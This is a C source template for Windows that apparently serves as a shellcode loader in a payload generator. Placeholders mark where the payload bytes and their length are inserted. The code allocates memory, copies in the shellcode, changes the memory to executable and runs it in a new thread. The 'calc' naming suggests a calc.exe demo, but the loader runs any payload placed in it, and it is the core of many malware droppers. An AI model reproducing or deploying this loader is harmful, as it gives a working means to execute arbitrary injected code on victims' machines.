#include <windows.h>

unsigned char calc_payload[{{Len}}] = {
    {{Shellcode}}
};

unsigned int calc_len = sizeof(calc_payload);

int main(void) {
    
	PVOID calc;
	HANDLE th;
    DWORD oldProtect = 0;
	calc = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlMoveMemory(calc, calc_payload, calc_len);
	VirtualProtect(calc, calc_len, PAGE_EXECUTE_READ, &oldProtect);
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) calc, 0, 0, 0);
    WaitForSingleObject(th, -1);
	return 0;
}
